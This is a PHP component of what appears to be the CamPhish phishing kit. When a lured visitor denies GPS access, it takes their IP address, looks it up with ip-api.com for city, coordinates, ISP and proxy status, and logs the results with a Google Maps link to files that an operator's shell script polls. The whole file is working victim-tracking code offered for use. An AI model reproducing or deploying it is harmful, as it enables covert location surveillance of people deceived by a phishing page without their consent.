<?php
// CamPhish v2 - IP-based Geolocation Fallback
// Uses free ip-api.com when GPS is denied

$date = date('dMYHis');

// Get the IP address
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

// Clean IP (take first if multiple)
$ip = trim(explode(',', $ip)[0]);

// Skip localhost/private IPs
$private = false;
if ($ip === '127.0.0.1' || $ip === '::1' || preg_match('/^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/', $ip)) {
    $private = true;
}

if (!$private) {
    // Query ip-api.com (free, no key needed, 45 req/min limit)
    $apiUrl = "http://ip-api.com/json/{$ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    if ($data && $data['status'] === 'success') {
        $output = "=== IP-Based Location (Fallback) ===\n";
        $output .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
        $output .= "Note: This is approximate location from IP address\n";
        $output .= "---\n";
        $output .= "IP: " . $data['query'] . "\n";
        $output .= "Country: " . $data['country'] . " (" . $data['countryCode'] . ")\n";
        $output .= "Region: " . $data['regionName'] . "\n";
        $output .= "City: " . $data['city'] . "\n";
        $output .= "ZIP: " . $data['zip'] . "\n";
        $output .= "Latitude: " . $data['lat'] . "\n";
        $output .= "Longitude: " . $data['lon'] . "\n";
        $output .= "Timezone: " . $data['timezone'] . "\n";
        $output .= "ISP: " . $data['isp'] . "\n";
        $output .= "Organization: " . $data['org'] . "\n";
        $output .= "AS: " . $data['as'] . "\n";
        $output .= "Mobile: " . ($data['mobile'] ? 'Yes' : 'No') . "\n";
        $output .= "Proxy/VPN: " . ($data['proxy'] ? 'Yes' : 'No') . "\n";
        $output .= "Hosting: " . ($data['hosting'] ? 'Yes' : 'No') . "\n";
        $output .= "Google Maps: https://www.google.com/maps/place/" . $data['lat'] . "," . $data['lon'] . "\n";
        $output .= "Accuracy: ~City level (IP-based)\n";
        $output .= "====================================\n\n";
        
        // Save individual file
        $file = 'ip_location_' . $date . '.txt';
        file_put_contents($file, $output);
        
        // Save to master file
        file_put_contents('saved.ip_locations.txt', $output, FILE_APPEND);
        
        // Create current for shell script detection
        file_put_contents('current_ip_location.txt', $output);
        
        // Marker for shell script
        file_put_contents('IPLocationLog.log', "IP location captured\n", FILE_APPEND);
        
        // Save to directory
        if (!is_dir('saved_locations')) {
            mkdir('saved_locations', 0755, true);
        }
        copy($file, 'saved_locations/' . $file);
        
        header('Content-Type: application/json');
        echo json_encode([
            'status' => 'success',
            'type' => 'ip_based',
            'city' => $data['city'],
            'country' => $data['country'],
            'lat' => $data['lat'],
            'lon' => $data['lon']
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Geolocation lookup failed']);
    }
} else {
    // Private IP - can't geolocate
    $output = "=== IP-Based Location (Fallback) ===\n";
    $output .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
    $output .= "IP: " . $ip . " (Private/Local)\n";
    $output .= "Note: Cannot geolocate private IP address\n";
    $output .= "====================================\n\n";
    
    file_put_contents('current_ip_location.txt', $output);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Private IP - cannot geolocate']);
}

exit();
?>
